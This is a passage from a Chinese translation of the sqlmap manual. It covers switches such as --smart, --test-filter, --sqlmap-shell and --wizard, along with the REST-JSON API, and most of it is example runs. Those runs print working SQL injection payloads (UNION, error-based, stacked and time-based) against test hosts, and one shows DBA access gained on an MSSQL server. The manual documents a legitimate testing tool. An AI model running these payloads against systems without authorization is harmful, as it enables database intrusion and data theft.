[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'AppWall (Radware)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'ModSecurity: Open Source We
b Application Firewall (Trustwave)'
[xx:xx:23] [CRITICAL] WAF/IDS/IPS identified 'ModSecurity: Open Source Web Appli
cation Firewall (Trustwave)'. Please consider usage of tamper scripts (option '-
-tamper')
[...]
```

跳过启发式检测的ip/ip/ids保护

开关: `--skip-waf`

默认情况下，sqlmap会自动发送一个初始请求的虚拟参数值，其中包含一个故意“可疑”的SQL注入有效负载 (例如`...&foobar=AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1`). 如果目标的响应与原始请求的不同，那么很有可能它处于某种保护之下. 如果出现任何问题，用户可以通过使用`--skip-waf`来禁用该机制.

### 模仿智能手机

开关: `--mobile`

有时，web服务器会向移动电话显示不同的接口，而不是桌面计算机. 在这种情况下，您可以强制使用一种预先确定的智能手机HTTP用户代理头值.通过使用这个开关，sqlmap会让你选择一款流行的智能手机，它会在当前的运行中模仿.

运行实例:

```
$ python sqlmap.py -u "http://www.target.com/vuln.php?id=1" --mobile
[...]
which smartphone do you want sqlmap to imitate through HTTP User-Agent header?
[1] Apple iPhone 4s (default)
[2] BlackBerry 9900
[3] Google Nexus 7
[4] HP iPAQ 6365
[5] HTC Sensation
[6] Nokia N97
[7] Samsung Galaxy S
> 1
[...]
```

### 脱机模式下的工作(只使用会话数据)

开关: `--offline`

通过使用开关`--offline`sqlmap将仅使用数据枚举中的前一个会话数据. 这基本上意味着在运行期间将会有零连接尝试.

### 安全地从输出目录中删除所有内容

开关`--purge-output`

如果用户决定安全地从`output` 目录中删除所有内容，包含以前的sqlmap运行的所有目标细节，那么他可以使用开关-输出-输出`--purge-output`。在清除时，文件夹`output`中的所有文件(子)目录中的所有文件都将被用随机数据覆盖，被截断，重命名为随机名称，(子)目录也将被重命名为随机名称，最后整个目录树将被删除.

运行实例:

```
$ python sqlmap.py --purge-output -v 3
[...]
[xx:xx:55] [INFO] purging content of directory '/home/user/sqlmap/output'...
[xx:xx:55] [DEBUG] changing file attributes
[xx:xx:55] [DEBUG] writing random data to files
[xx:xx:55] [DEBUG] truncating files
[xx:xx:55] [DEBUG] renaming filenames to random values
[xx:xx:55] [DEBUG] renaming directory names to random values
[xx:xx:55] [DEBUG] deleting the whole directory tree
[...]
```

### 仅在积极启发式情况下进行测试

开关 `--smart`

有些情况下，用户有大量潜在的目标url(例如，提供选项`-m`)，他希望尽快找到一个易受攻击的目标。如果开关`--smart`被使用，只会部分参数被激发，在扫描中会被进一步使用，否则他们跳过.

针对MySQL目标的示例:

```
$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&use\
r=foo&id=1" --batch --smart
[...]
[xx:xx:14] [INFO] testing if GET parameter 'ca' is dynamic
[xx:xx:14] [WARNING] GET parameter 'ca' does not appear dynamic
[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might 
not be injectable
[xx:xx:14] [INFO] skipping GET parameter 'ca'
[xx:xx:14] [INFO] testing if GET parameter 'user' is dynamic
[xx:xx:14] [WARNING] GET parameter 'user' does not appear dynamic
[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'user' migh
t not be injectable
[xx:xx:14] [INFO] skipping GET parameter 'user'
[xx:xx:14] [INFO] testing if GET parameter 'id' is dynamic
[xx:xx:14] [INFO] confirming that GET parameter 'id' is dynamic
[xx:xx:14] [INFO] GET parameter 'id' is dynamic
[xx:xx:14] [WARNING] reflective value(s) found and filtering out
[xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be 
injectable (possible DBMS: 'MySQL')
[xx:xx:14] [INFO] testing for SQL injection on GET parameter 'id'
heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you 
want to skip test payloads specific for other DBMSes? [Y/n] Y
do you want to include all tests for 'MySQL' extending provided level (1) and ri
sk (1)? [Y/n] Y
[xx:xx:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[xx:xx:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVI
NG clause' injectable 
[xx:xx:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause
'
[xx:xx:14] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or
 HAVING clause' injectable 
[xx:xx:14] [INFO] testing 'MySQL inline queries'
[xx:xx:14] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[xx:xx:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[xx:xx:14] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL > 5.0.11 AND time-based blind' in
jectable 
[xx:xx:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[xx:xx:24] [INFO] automatically extending ranges for UNION query injection techn
ique tests as there is at least one other potential injection technique found
[xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the 
time needed to find the right number of query columns. Automatically extending t
he range for current UNION query injection technique test
[xx:xx:24] [INFO] target URL appears to have 3 columns in query
[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 colu
mns' injectable
[...]
```

### 通过负载和/或标题选择(或跳过)测试

开关 `--test-filter`

如果你想要通过他们的有效载荷和/或标题来过滤测试你可以使用这个选项. 例如,如果你想测试所有有`ROW`关键字的有效负载，你可以使用`--test-filter=ROW`.

针对MySQL目标的示例:

```
$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --b\
atch --test-filter=ROW
[...]
[xx:xx:39] [INFO] GET parameter 'id' is dynamic
[xx:xx:39] [WARNING] reflective value(s) found and filtering out
[xx:xx:39] [INFO] heuristic (basic) test shows that GET parameter 'id' might be 
injectable (possible DBMS: 'MySQL')
[xx:xx:39] [INFO] testing for SQL injection on GET parameter 'id'
[xx:xx:39] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause
'
[xx:xx:39] [INFO] GET parameter 'id' is 'MySQL >= 4.1 AND error-based - WHERE or
 HAVING clause' injectable 
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any
)? [y/N] N
sqlmap identified the following injection points with a total of 3 HTTP(s) reque
sts:
---
Place: GET
Parameter: id
    Type: error-based
    Title: MySQL >= 4.1 AND error-based - WHERE or HAVING clause
    Payload: id=1 AND ROW(4959,4971)>(SELECT COUNT(*),CONCAT(0x3a6d70623a,(SELEC
T (C
    ASE WHEN (4959=4959) THEN 1 ELSE 0 END)),0x3a6b7a653a,FLOOR(RAND(0)*2))x FRO
M (S
    ELECT 4706 UNION SELECT 3536 UNION SELECT 7442 UNION SELECT 3470)a GROUP BY 
x)
---
[...]
```

选项 `--test-skip=TEST`

如果你想通过它们的有效载荷和/或标题跳过测试你可以使用这个选项. 例如,如果你想跳过所有有`BENCHMARK`关键字的有效载荷，你可以使用`--test-skip=BENCHMARK`.

### 交互式sqlmap壳

开关: `--sqlmap-shell`

通过使用开关`--sqlmap-shell` 用户将被呈现交互式sqlmap shell，该shell具有使用过的选项和/或开关的所有以前运行的历史:

```
$ python sqlmap.py --sqlmap-shell
sqlmap-shell> -u "http://testphp.vulnweb.com/artists.php?artist=1" --technique=\
BEU --batch
         _
 ___ ___| |_____ ___ ___  {1.0-dev-2188502}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual
 consent is illegal. It is the end user's responsibility to obey all applicable 
local, state and federal laws. Developers assume no liability and are not respon
sible for any misuse or damage caused by this program

[*] starting at xx:xx:11

[xx:xx:11] [INFO] testing connection to the target URL
[xx:xx:12] [INFO] testing if the target URL is stable
[xx:xx:13] [INFO] target URL is stable
[xx:xx:13] [INFO] testing if GET parameter 'artist' is dynamic
[xx:xx:13] [INFO] confirming that GET parameter 'artist' is dynamic
[xx:xx:13] [INFO] GET parameter 'artist' is dynamic
[xx:xx:13] [INFO] heuristic (basic) test shows that GET parameter 'artist' might
 be injectable (possible DBMS: 'MySQL')
[xx:xx:13] [INFO] testing for SQL injection on GET parameter 'artist'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads sp
ecific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending 
provided level (1) and risk (1) values? [Y/n] Y
[xx:xx:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[xx:xx:13] [INFO] GET parameter 'artist' seems to be 'AND boolean-based blind - 
WHERE or HAVING clause' injectable 
[xx:xx:13] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER B
Y or GROUP BY clause'
[xx:xx:13] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY
 or GROUP BY clause'
[xx:xx:13] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER B
Y or GROUP BY clause (EXTRACTVALUE)'
[xx:xx:13] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY
 or GROUP BY clause (EXTRACTVALUE)'
[xx:xx:14] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER B
Y or GROUP BY clause (UPDATEXML)'
[xx:xx:14] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY
 or GROUP BY clause (UPDATEXML)'
[xx:xx:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER B
Y or GROUP BY clause (EXP)'
[xx:xx:14] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (E
XP)'
[xx:xx:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER B
Y or GROUP BY clause (BIGINT UNSIGNED)'
[xx:xx:14] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (B
IGINT UNSIGNED)'
[xx:xx:14] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER B
Y or GROUP BY clause'
[xx:xx:14] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE, HAVING clause'
[xx:xx:14] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause'
[xx:xx:14] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACT
VALUE)'
[xx:xx:14] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'
[xx:xx:14] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACT
VALUE)'
[xx:xx:15] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEX
ML)'
[xx:xx:15] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[xx:xx:15] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT 
UNSIGNED)'
[xx:xx:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[xx:xx:15] [INFO] automatically extending ranges for UNION query injection techn
ique tests as there is at least one other (potential) technique found
[xx:xx:15] [INFO] ORDER BY technique seems to be usable. This should reduce the 
time needed to find the right number of query columns. Automatically extending t
he range for current UNION query injection technique test
[xx:xx:15] [INFO] target URL appears to have 3 columns in query
[xx:xx:16] [INFO] GET parameter 'artist' is 'Generic UNION query (NULL) - 1 to 2
0 columns' injectable
GET parameter 'artist' is vulnerable. Do you want to keep testing the others (if
 any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 39 HTTP(s) re
quests:
---
Parameter: artist (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: artist=1 AND 5707=5707

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: artist=-7983 UNION ALL SELECT CONCAT(0x716b706271,0x6f6c506a7473764
26d58446f634454616a4c647a6c6a69566e584e454c64666f6861466e697a5069,0x716a786a71),
NULL,NULL-- -
---
[xx:xx:16] [INFO] testing MySQL
[xx:xx:16] [INFO] confirming MySQL
[xx:xx:16] [INFO] the back-end DBMS is MySQL
web application technology: Nginx, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.0
[xx:xx:16] [INFO] fetched data logged to text files under '/home/stamparm/.sqlma
p/output/testphp.vulnweb.com'
sqlmap-shell> -u "http://testphp.vulnweb.com/artists.php?artist=1" --banner
         _
 ___ ___| |_____ ___ ___  {1.0-dev-2188502}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual
 consent is illegal. It is the end user's responsibility to obey all applicable 
local, state and federal laws. Developers assume no liability and are not respon
sible for any misuse or damage caused by this program

[*] starting at xx:xx:25

[xx:xx:26] [INFO] resuming back-end DBMS 'mysql' 
[xx:xx:26] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: artist (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: artist=1 AND 5707=5707

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: artist=-7983 UNION ALL SELECT CONCAT(0x716b706271,0x6f6c506a7473764
26d58446f634454616a4c647a6c6a69566e584e454c64666f6861466e697a5069,0x716a786a71),
NULL,NULL-- -
---
[xx:xx:26] [INFO] the back-end DBMS is MySQL
[xx:xx:26] [INFO] fetching banner
web application technology: Nginx, PHP 5.3.10
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL 5
banner:    '5.1.73-0ubuntu0.10.04.1'
[xx:xx:26] [INFO] fetched data logged to text files under '/home/stamparm/.sqlma
p/output/testphp.vulnweb.com' 
sqlmap-shell> exit
```

### 为初学者用户提供简单的向导界面

开关: `--wizard`

对于初学者来说，有一个向导界面，它使用一个简单的工作流以及尽可能少的问题. 如果用户只是输入目标URL并使用默认的答案(例如通过按`Enter`) 在工作流程的最后，他应该有一个适当设置的sqlmap运行环境.

针对Microsoft SQL Server目标的示例:

```
$ python sqlmap.py --wizard

    sqlmap/1.0-dev-2defc30 - automatic SQL injection and database takeover tool
    http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual
 consent is illegal. It is the end user's responsibility to obey all applicable 
local, state and federal laws. Developers assume no liability and are not respon
sible for any misuse or damage caused by this program

[*] starting at xx:xx:26

Please enter full target URL (-u): http://192.168.21.129/sqlmap/mssql/iis/get_in
t.asp?id=1
POST data (--data) [Enter for None]: 
Injection difficulty (--level/--risk). Please choose:
[1] Normal (default)
[2] Medium
[3] Hard
> 1
Enumeration (--banner/--current-user/etc). Please choose:
[1] Basic (default)
[2] Smart
[3] All
> 1

sqlmap is running, please wait..

heuristic (parsing) test showed that the back-end DBMS could be 'Microsoft SQL S
erver'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
do you want to include all tests for 'Microsoft SQL Server' extending provided l
evel (1) and risk (1)? [Y/n] Y
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any
)? [y/N] N
sqlmap identified the following injection points with a total of 25 HTTP(s) requ
ests:
---
Place: GET
Parameter: id
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 2986=2986

    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
    Payload: id=1 AND 4847=CONVERT(INT,(CHAR(58)+CHAR(118)+CHAR(114)+CHAR(100)+C
HAR(58)+(SELECT (CASE WHEN (4847=4847) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58
)+CHAR(111)+CHAR(109)+CHAR(113)+CHAR(58)))

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(58)+CHAR(118)+CHAR(114)+CHAR(1
00)+CHAR(58)+CHAR(70)+CHAR(79)+CHAR(118)+CHAR(106)+CHAR(87)+CHAR(101)+CHAR(119)+
CHAR(115)+CHAR(114)+CHAR(77)+CHAR(58)+CHAR(111)+CHAR(109)+CHAR(113)+CHAR(58)-- 

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries
    Payload: id=1; WAITFOR DELAY '0:0:5'--

    Type: AND/OR time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind
    Payload: id=1 WAITFOR DELAY '0:0:5'--

    Type: inline query
    Title: Microsoft SQL Server/Sybase inline queries
    Payload: id=(SELECT CHAR(58)+CHAR(118)+CHAR(114)+CHAR(100)+CHAR(58)+(SELECT 
(CASE WHEN (6382=6382) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR
(109)+CHAR(113)+CHAR(58))
---
web server operating system: Windows XP
web application technology: ASP, Microsoft IIS 5.1
back-end DBMS operating system: Windows XP Service Pack 2
back-end DBMS: Microsoft SQL Server 2005
banner:
---
Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
    Oct 14 2005 00:33:37 
    Copyright (c) 1988-2005 Microsoft Corporation
    Express Edition on Windows NT 5.1 (Build 2600: Service Pack 2)
---
current user:    'sa'
current database:    'testdb'
current user is DBA:    True

[*] shutting down at xx:xx:52
```

## API (REST-JSON)

sqlmap可以通过REST-JSON API(用于应用程序接口的API)来运行，该API用于REST(用于表示状态传输)之间的通信，服务器和客户端实例之间的通信。简单地说，服务器运行sqlmap扫描，而客户端正在设置sqlmap选项/交换机，并将结果拉回来。运行该API的主要程序文件是`sqlmapapi.py`，客户端也可以在任意的用户程序中实现.

```
$ python sqlmapapi.py -hh
Usage: sqlmapapi.py [options]

Options:
  -h, --help            show this help message and exit
  -s, --server          Act as a REST-JSON API server
  -c, --client          Act as a REST-JSON API client
  -H HOST, --host=HOST  Host of the REST-JSON API server (default "127.0.0.1")
  -p PORT, --port=PORT  Port of the the REST-JSON API server (default 8775)
  --adapter=ADAPTER     Server (bottle) adapter to use (default "wsgiref")
```

服务器通过使用开关 `-s`运行`sqlmapapi.py`，客户端使用开关`-c`，在这两种情况下，用户都可以(可选地)设置选项`-H`(默认为`"127.0.0.1"`)的监听IP地址和选择`-p`(默认`8775`)的监听端口。每个客户的“会话”都可以有多个“任务”(例如，sqlmap扫描运行)，用户可以任意选择当前活动的任务.

在客户端命令行界面中，可用的命令是:

* `help` - 显示可用命令的列表以及基本的帮助信息
* `new ARGS` - 使用提供的参数启动一个新的扫描任务 (例如`new -u "http://testphp.vulnweb.com/artists.php?artist=1"`)
* `use TASKID` - 将当前上下文切换到不同的任务(例如`use c04d8c5c7582efb4`)
* `data` - 检索和显示当前任务的数据
* `log`- 检索和显示当前任务的日志
* `status` - 检索并显示当前任务的状态
* `stop` - 停止当前任务
* `kill` - 终结当前任务
* `list` - 显示所有任务(当前会话)
* `flush` -清理(即删除)所有任务
* `exit` - 退出客户端接口

服务器运行示例:

```
$ python sqlmapapi.py -s -H "0.0.0.0"
[12:47:51] [INFO] Running REST-JSON API server at '0.0.0.0:8775'..
[12:47:51] [INFO] Admin ID: 89fd118997840a9bd7fc329ab535b881
[12:47:51] [DEBUG] IPC database: /tmp/sqlmapipc-SzBQnd
[12:47:51] [DEBUG] REST-JSON API server connected to IPC database
[12:47:51] [DEBUG] Using adapter 'wsgiref' to run bottle
[12:48:10] [DEBUG] Created new task: 'a42ddaef02e976f0'
[12:48:10] [DEBUG] [a42ddaef02e976f0] Started scan
[12:48:16] [DEBUG] [a42ddaef02e976f0] Retrieved scan status
[12:48:50] [DEBUG] [a42ddaef02e976f0] Retrieved scan status
[12:48:55] [DEBUG] [a42ddaef02e976f0] Retrieved scan log messages
[12:48:59] [DEBUG] [a42ddaef02e976f0] Retrieved scan data and error messages
```

客户机运行示例:

```
$ python sqlmapapi.py -c -H "192.168.110.1"
[12:47:53] [DEBUG] Example client access from command line:
    $ taskid=$(curl http://192.168.110.1:8775/task/new 2>1 | grep -o -I '[a-f0-9
]\{16\}') && echo $taskid
    $ curl -H "Content-Type: application/json" -X POST -d '{"url": "http://testp
hp.vulnweb.com/artists.php?artist=1"}' http://192.168.110.1:8775/scan/$taskid/st
art
    $ curl http://192.168.110.1:8775/scan/$taskid/data
    $ curl http://192.168.110.1:8775/scan/$taskid/log
[12:47:53] [INFO] Starting REST-JSON API client to 'http://192.168.110.1:8775'..
.
[12:47:53] [DEBUG] Calling http://192.168.110.1:8775
[12:47:53] [INFO] Type 'help' or '?' for list of available commands
api> ?
help        Show this help message
new ARGS    Start a new scan task with provided arguments (e.g. 'new -u "http://
testphp.vulnweb.com/artists.php?artist=1"')
use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4
')
data        Retrieve and show data for current task
log         Retrieve and show log for current task
status      Retrieve and show status for current task
stop        Stop current task
kill        Kill current task
list        Display all tasks
flush       Flush tasks (delete all tasks)
exit        Exit this client
api> new -u "http://testphp.vulnweb.com/artists.php?artist=1" --banner --flush-s
ession
[12:48:10] [DEBUG] Calling http://192.168.110.1:8775/task/new
[12:48:10] [INFO] New task ID is 'a42ddaef02e976f0'
[12:48:10] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/start
[12:48:10] [INFO] Scanning started
api (a42ddaef02e976f0)> status
[12:48:16] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/statu
s
{
    "status": "running", 
    "returncode": null, 
    "success": true
}
api (a42ddaef02e976f0)> status
[12:48:50] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/statu
s
{
    "status": "terminated", 
    "returncode": 0, 
    "success": true
}
api (a42ddaef02e976f0)> log
[12:48:55] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/log
{
    "log": [
        {
            "message": "flushing session file", 
            "level": "INFO", 
            "time": "12:48:10"
        }, 
        {
            "message": "testing connection to the target URL", 
            "level": "INFO", 
            "time": "12:48:10"
        }, 
        {
            "message": "checking if the target is protected by some kind of WAF/
IPS/IDS", 
            "level": "INFO", 
            "time": "12:48:10"
        }, 
        {
            "message": "testing if the target URL is stable", 
            "level": "INFO", 
            "time": "12:48:10"
        }, 
        {
            "message": "target URL is stable", 
            "level": "INFO", 
            "time": "12:48:11"
        }, 
        {
            "message": "testing if GET parameter 'artist' is dynamic", 
            "level": "INFO", 
            "time": "12:48:11"
        }, 
        {
            "message": "confirming that GET parameter 'artist' is dynamic", 
            "level": "INFO", 
            "time": "12:48:11"
        }, 
        {
            "message": "GET parameter 'artist' is dynamic", 
            "level": "INFO", 
            "time": "12:48:11"
        }, 
        {
            "message": "heuristic (basic) test shows that GET parameter 'artist'
 might be injectable (possible DBMS: 'MySQL')", 
            "level": "INFO", 
            "time": "12:48:11"
        }, 
        {
            "message": "testing for SQL injection on GET parameter 'artist'", 
            "level": "INFO", 
            "time": "12:48:11"
        }, 
        {
            "message": "testing 'AND boolean-based blind - WHERE or HAVING claus
e'", 
            "level": "INFO", 
            "time": "12:48:11"
        }, 
        {
            "message": "GET parameter 'artist' appears to be 'AND boolean-based 
blind - WHERE or HAVING clause' injectable (with --string=\"hac\")", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (BIGINT UNSIGNED)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING cla
use (BIGINT UNSIGNED)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (EXP)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING cla
use (EXP)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING,
 ORDER BY or GROUP BY clause (JSON_KEYS)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.7.8 OR error-based - WHERE, HAVING c
lause (JSON_KEYS)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (FLOOR)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, OR
DER BY or GROUP BY clause (FLOOR)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (EXTRACTVALUE)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, OR
DER BY or GROUP BY clause (EXTRACTVALUE)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (UPDATEXML)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, OR
DER BY or GROUP BY clause (UPDATEXML)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (FLOOR)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 4.1 OR error-based - WHERE, HAVING cla
use (FLOOR)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL OR error-based - WHERE or HAVING clause (
FLOOR)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (E
XTRACTVALUE)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.5 error-based - Parameter replace (B
IGINT UNSIGNED)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.5 error-based - Parameter replace (E
XP)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.7.8 error-based - Parameter replace 
(JSON_KEYS)'", 
            "level": "INFO", 
            "time": "12:48:12"
        }, 
        {
            "message": "testing 'MySQL >= 5.0 error-based - Parameter replace (F
LOOR)'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL >= 5.1 error-based - Parameter replace (U
PDATEXML)'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL >= 5.1 error-based - Parameter replace (E
XTRACTVALUE)'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL inline queries'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL > 5.0.11 stacked queries (comment)'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL > 5.0.11 stacked queries'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL > 5.0.11 stacked queries (query SLEEP - c
omment)'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL < 5.0.12 stacked queries (heavy query - c
omment)'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL < 5.0.12 stacked queries (heavy query)'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "testing 'MySQL >= 5.0.12 AND time-based blind'", 
            "level": "INFO", 
            "time": "12:48:13"
        }, 
        {
            "message": "GET parameter 'artist' appears to be 'MySQL >= 5.0.12 AN
D time-based blind' injectable ", 
            "level": "INFO", 
            "time": "12:48:23"
        }, 
        {
            "message": "testing 'Generic UNION query (NULL) - 1 to 20 columns'", 
            "level": "INFO", 
            "time": "12:48:23"
        }, 
        {
            "message": "automatically extending ranges for UNION query injection
 technique tests as there is at least one other (potential) technique found", 
            "level": "INFO", 
            "time": "12:48:23"
        }, 
        {
            "message": "'ORDER BY' technique appears to be usable. This should r
educe the time needed to find the right number of query columns. Automatically e
xtending the range for current UNION query injection technique test", 
            "level": "INFO", 
            "time": "12:48:23"
        }, 
        {
            "message": "target URL appears to have 3 columns in query", 
            "level": "INFO", 
            "time": "12:48:23"
        }, 
        {
            "message": "GET parameter 'artist' is 'Generic UNION query (NULL) - 
1 to 20 columns' injectable", 
            "level": "INFO", 
            "time": "12:48:24"
        }, 
        {
            "message": "the back-end DBMS is MySQL", 
            "level": "INFO", 
            "time": "12:48:24"
        }, 
        {
            "message": "fetching banner", 
            "level": "INFO", 
            "time": "12:48:24"
        }
    ], 
    "success": true
}
api (a42ddaef02e976f0)> data
[12:48:59] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/data
{
    "data": [
        {
            "status": 1, 
            "type": 0, 
            "value": [
                {
                    "dbms": "MySQL", 
                    "suffix": "", 
                    "clause": [
                        1, 
                        9
                    ], 
                    "notes": [], 
                    "ptype": 1, 
                    "dbms_version": [
                        ">= 5.0.12"
                    ], 
                    "prefix": "", 
                    "place": "GET", 
                    "os": null, 
                    "conf": {
                        "code": null, 
                        "string": "hac", 
                        "notString": null, 
                        "titles": false, 
                        "regexp": null, 
                        "textOnly": false, 
